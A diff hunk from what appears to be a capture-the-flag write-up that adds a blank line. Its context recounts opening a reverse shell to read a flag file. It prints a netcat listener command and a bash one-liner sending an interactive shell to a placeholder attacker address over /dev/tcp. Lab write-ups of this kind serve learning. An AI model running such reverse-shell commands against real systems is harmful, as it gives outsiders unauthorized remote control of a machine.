@@ -70,6 +70,7 @@ I tried entering some commands and received information that my workind director
 
 The `cat` command didn't work. So i remebered the tip from the very beginning: need to use a reverse shell.
 At first, I wanted to use Metasploit, but later realized it wasn't necessary. So I used Netcat (`nc -lvnp 4444`) on the attack machine and bash in the Command Panel (`bash -c 'exec bash -i &>/dev/tcp/ATTACK_IP/4444 <&1`). After establishing a connection, I was able to read the file and find the first ingredient.
+
 ![](./screenshots/8.png)
 
 Afterwards I read the second found file and got hint.
